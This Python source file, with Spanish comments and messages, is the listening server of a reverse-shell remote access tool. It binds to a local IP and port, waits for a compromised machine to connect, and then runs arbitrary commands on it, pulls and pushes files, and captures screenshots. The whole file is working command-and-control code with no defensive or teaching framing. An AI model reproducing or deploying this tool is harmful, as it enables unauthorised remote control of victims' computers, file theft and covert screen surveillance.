#!/usr/bin/env python
#_*_coding: utf8_*_

import socket
import base64


def shell():
    current_dir = target.recv(1024)
    count = 0
    while True:
        comando = raw_input("{}~#: ".format(current_dir))
        if comando == "exit":
            target.send(comando)
            break
        elif comando[:2] == "cd":
            target.send(comando)
            res = target.recv(1024)
            current_dir = res
            print(res)
        elif comando == "":
            pass
        elif comando[:8] == "download":
            target.send(comando)
            with open(comando[9:],'wb') as file_download:
                datos = target.recv(30000)
                file_download.write(base64.b64decode(datos))
        elif comando[:6] == "upload":
            try:
                target.send(comando)
                with open(comando[7:],'rb') as file_upload:
                    target.send(base64.b64encode(file_upload.read()))
            except:
                print("Ocurrio un error en la subida")
        elif comando[:10] == "screenshot":
            target.send(comando)
            with open("monitor-%d.png"% count,'wb') as screen:
                datos = target.recv(1000000)
                data_decode = base64.b64decode(datos)
                if data_decode == "fail":
                    print("No se pudo tomar la captura de pantalla")
                else:
                    screen.write(data_decode)
                    print("Captura tomada con exito")
                    count = count+1
        else:    
            target.send(comando)
            res = target.recv(30000)
            if res == "1":
                continue
            else:
                print(res)


def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('192.168.0.2',7777))
    server.listen(1)

    print("Corriendo Server y esperando conexiones...")

    target, ip = server.accept()
    print("Conexion recibida de: "+ str(ip[0]))

upserver()
shell()
server.close()